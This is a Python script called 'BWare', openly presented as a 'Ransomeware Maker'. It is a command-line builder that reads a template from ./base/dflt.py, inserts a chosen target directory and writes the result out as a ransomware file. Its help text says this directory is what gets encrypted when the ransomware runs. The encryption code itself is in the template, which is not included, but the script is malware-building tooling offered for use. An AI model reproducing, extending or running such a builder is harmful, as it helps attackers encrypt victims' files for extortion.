import os
import sys

code = ''
all_dir = []
all_s_dir = []
all_s_file = []
allsd = {}

def make_ware(tdir,tfname):
    with open('./base/dflt.py') as f:
        code = f.read()
    code = code.replace("input()","'"+tdir+"'")
    f = open(str(tfname),'w')
    f.write(code)

if len(sys.argv) > 1:
    pass
else:
    os.system('clear')
    print('\033[92m'+'''
            bbbbbbbbbbbbbbbbb   W    WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW   W
            bb              bb  WW   WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW   WW
            bb               bb WWW   WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW   WWW
            bb              bb  WWWW   WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW   WWWW
            bb             bb   WWWWW   WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW   WWWWW
            bbbbbbbbbbbbbbbb    WWWWWW   WWWWWWWWWWWWWWWWWWWWWWWWWWWWW   WWWWWW
            bbbbbbbbbbbbbbbb    WWWWWWW   WWWWWWWWWWWWWWWWWWWWWWWWWWW   WWWWWWW
            bb             bb   WWWWWWWW   WWWWWWWWWWWWWWWWWWWWWWWWW   WWWWWWWW
            bb              bb  WWWWWWWWW   WWWWWW         WWWWWWWW   WWWWWWWWW
            bb               bb WWWWWWWWWW   WWWW   WWWWW   WWWWWW   WWWWWWWWWW
            bb              bb  WWWWWWWWWWW   WW   WWWWWWW   WWWW   WWWWWWWWWWW
            bb             bb   WWWWWWWWWWWW      WWWWWWWWW   WW   WWWWWWWWWWWW
            bbbbbbbbbbbbbbbb    WWWWWWWWWWWWW   WWWWWWWWWWWW      WWWWWWWWWWWWW

    '''+'\033[0m')
    print('\033[93m'+'''
                                       Tool :- BWare
                               Tool type :- Ransomeware Maker
                                     Created by :- B2H
                        B2H's github :- https://github.com/back-2-hack
    '''+'\033[0m')

try:
    if sys.argv[1] == '--target' or sys.argv[1] == '-t' and sys.argv[3]=='-o' or sys.argv[3]=='--out':
        if sys.argv[2][-1]=='/':
            t_dir_t=sys.argv[2][:-1]
            make_ware(t_dir_t,sys.argv[4])
        else:
            make_ware(sys.argv[2],sys.argv[4])
except IndexError:
    try:
        if sys.argv[1] == '-h' or sys.argv[1] == '--help':
            pass
    except:
        print('\n\033[91m'+'Plzz enter arguments correctly | -h for HELP'+'\033[0m\n')

try:
    if sys.argv[1] == '-h' or sys.argv[1] == '-help' or sys.argv[1] == '--help':
        print('''
    __________________________________________________________________________________________
    |                                                                                         |
    | -t or --target {                                                                        |
    |     Use : To set target directory                                                       |
    |     Explaination : Name of directory you want to encrypt when ransomware gets executed  |
    | }                                                                                       |
    |                                                                                         |
    | -o or --out {                                                                           |
    |      Use : Set output file                                                              |
    |      Explaination : Name of file where you want to store ransomware                     |
    |                                                                                         |
    | }                                                                                       |
    |                                                                                         |
    | Example {                                                                               |
    |    Command : python3 bware.py -t ~/Desktop/example_dir/ -o my_ransomware.py             |
    |    Explaination of command : python3 bware.py -t <Target directory> -o <Output file>    |
    | }                                                                                       |
    \_________________________________________________________________________________________/
        ''')
except:
    pass
try:
    if sys.argv[2] == '':
        print('\nPlzz enter a valid directory name...')
        sys.exit()
except:
    sys.exit()

